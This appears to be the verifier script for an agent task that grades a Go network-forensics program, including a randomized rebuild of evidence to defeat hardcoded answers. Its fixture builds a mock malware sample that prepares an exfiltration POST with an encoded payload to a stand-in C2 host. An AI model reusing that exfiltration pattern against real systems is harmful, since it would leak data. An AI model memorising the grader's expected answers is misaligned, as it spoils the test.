#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import base64
import hashlib
import json
import os
import secrets
import stat
import subprocess

HOME = "/home/user"
SOURCE = os.path.join(HOME, "forensics.go")
REPORT = os.path.join(HOME, "forensics_report.json")
EXECUTABLE = "/tmp/forensics_submission"


def run(cmd, timeout=120):
    return subprocess.run(
        cmd,
        cwd=HOME,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
        check=True,
    )


def execute_submission():
    if os.path.lexists(REPORT):
        os.remove(REPORT)
    run([EXECUTABLE], timeout=45)
    assert os.path.isfile(REPORT), f"The report file {REPORT} was not created."
    with open(REPORT, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            assert False, f"The file {REPORT} does not contain valid JSON."


def test_forensics_program_and_report():
    # Preserve the original source-file assertion, then ensure it is a real Go
    # source artifact that can be compiled and executed.
    assert os.path.isfile(SOURCE), f"The Go script {SOURCE} was not found."
    assert stat.S_ISREG(os.lstat(SOURCE).st_mode), f"The Go script {SOURCE} must be a regular file."
    run(["go", "build", "-o", EXECUTABLE, SOURCE])

    # Execute the submitted program against the original supplied evidence.
    data = execute_submission()

    assert "c2_ip" in data, "Missing 'c2_ip' in report."
    assert data["c2_ip"] == "192.168.100.55", f"Incorrect c2_ip. Expected '192.168.100.55', got '{data['c2_ip']}'."

    assert "c2_port" in data, "Missing 'c2_port' in report."
    assert int(data["c2_port"]) == 8443, f"Incorrect c2_port. Expected 8443, got {data['c2_port']}."

    assert "auth_cookie" in data, "Missing 'auth_cookie' in report."
    assert "MaliciousToken-7712" in data["auth_cookie"], f"Incorrect auth_cookie. Expected it to contain 'MaliciousToken-7712', got '{data['auth_cookie']}'."

    assert "custom_header_name" in data, "Missing 'custom_header_name' in report."
    assert data["custom_header_name"] == "X-Data-Exfil", f"Incorrect custom_header_name. Expected 'X-Data-Exfil', got '{data['custom_header_name']}'."

    assert "compromised_file" in data, "Missing 'compromised_file' in report."
    assert "config_C.conf" in data["compromised_file"], f"Incorrect compromised_file. Expected 'config_C.conf', got '{data['compromised_file']}'."

    assert "decoded_payload" in data, "Missing 'decoded_payload' in report."
    assert data["decoded_payload"] == "SecretForensicsData_992", f"Incorrect decoded_payload. Expected 'SecretForensicsData_992', got '{data['decoded_payload']}'."

    # Replace all evidence with a verifier-generated instance so a hardcoded
    # report cannot pass. Expected answers are derived from these fresh values.
    tag = secrets.token_hex(6)
    c2_ip = f"198.51.100.{secrets.randbelow(200) + 20}"
    c2_port = secrets.randbelow(20000) + 20000
    header = f"X-Data-{tag}"
    cookie_value = f"Token-{secrets.token_hex(10)}"
    payload = f"forensic-payload-{secrets.token_hex(12)}"
    encoded_payload = base64.b64encode(payload.encode()).decode()

    malware_source = f'''package main
import (
    "fmt"
    "net/http"
)
func main() {{
    c2URL := "http://{c2_ip}:{c2_port}/upload"
    req, _ := http.NewRequest("POST", c2URL, nil)
    req.Header.Add("{header}", "{encoded_payload}")
    req.AddCookie(&http.Cookie{{Name: "SessionAuth", Value: "{cookie_value}"}})
    fmt.Println("Connecting to", c2URL)
}}
'''
    dynamic_source = "/tmp/verifier_dynamic_malware.go"
    with open(dynamic_source, "w") as f:
        f.write(malware_source)
    run(["go", "build", "-o", os.path.join(HOME, "malware_bin"), dynamic_source])

    evidence_dir = os.path.join(HOME, "evidence")
    os.makedirs(evidence_dir, exist_ok=True)
    for entry in os.listdir(evidence_dir):
        path = os.path.join(evidence_dir, entry)
        if os.path.isfile(path) or os.path.islink(path):
            os.remove(path)

    compromised = f"changed_{tag}.conf"
    contents = {
        f"alpha_{tag}.conf": secrets.token_bytes(31),
        compromised: secrets.token_bytes(37),
        f"omega_{tag}.conf": secrets.token_bytes(43),
    }
    known_lines = []
    for name, content in contents.items():
        with open(os.path.join(evidence_dir, name), "wb") as f:
            f.write(content)
        digest = hashlib.sha256(content).hexdigest()
        known_lines.append(f"{digest}  evidence/{name}\n")
    with open(os.path.join(HOME, "known_hashes.txt"), "w") as f:
        f.writelines(known_lines)
    with open(os.path.join(evidence_dir, compromised), "ab") as f:
        f.write(b"\nverifier-generated-persistence\n")

    traffic = [
        {"method": "GET", "ip": "10.0.0.8", "port": 80,
         "headers": {"User-Agent": "Mozilla"}, "cookie": ""},
        {"method": "POST", "ip": c2_ip, "port": c2_port,
         "headers": {header: encoded_payload},
         "cookie": f"SessionAuth={cookie_value}"},
        {"method": "POST", "ip": c2_ip, "port": c2_port,
         "headers": {header: base64.b64encode(b"decoy").decode()},
         "cookie": "SessionAuth=wrong-token"},
    ]
    with open(os.path.join(HOME, "traffic.log"), "w") as f:
        for record in traffic:
            f.write(json.dumps(record) + "\n")

    dynamic = execute_submission()
    assert dynamic.get("c2_ip") == c2_ip, f"Program did not derive the generated C2 IP: {dynamic.get('c2_ip')}"
    assert int(dynamic.get("c2_port")) == c2_port, f"Program did not derive the generated C2 port: {dynamic.get('c2_port')}"
    assert cookie_value in dynamic.get("auth_cookie", ""), f"Program did not derive the generated auth cookie: {dynamic.get('auth_cookie')}"
    assert dynamic.get("custom_header_name") == header, f"Program did not derive the generated custom header: {dynamic.get('custom_header_name')}"
    assert compromised in dynamic.get("compromised_file", ""), f"Program did not identify the generated compromised file: {dynamic.get('compromised_file')}"
    assert dynamic.get("decoded_payload") == payload, f"Program did not decode the generated payload: {dynamic.get('decoded_payload')}"
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
